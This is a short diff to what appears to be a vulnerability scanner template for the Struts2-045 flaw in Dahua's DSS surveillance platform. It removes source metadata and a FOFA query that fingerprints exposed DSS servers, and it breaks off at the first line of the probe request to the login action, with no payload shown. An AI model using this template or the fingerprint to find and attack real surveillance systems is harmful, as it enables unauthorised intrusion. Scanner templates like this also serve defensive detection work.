@@ -3,12 +3,8 @@ info:
   name: 大华城市安防监控系统平台管理 DSS Struct2-045
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cm7nmqvl4q97cugb'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cm7nmqvl4q97cugb
-    fofa: body="/portal/include/script/dahuaDefined/headCommon.js?type=index"&&title="DSS"
 http:
 - raw:
   - 'GET /admin/login_login.action HTTP/1.1
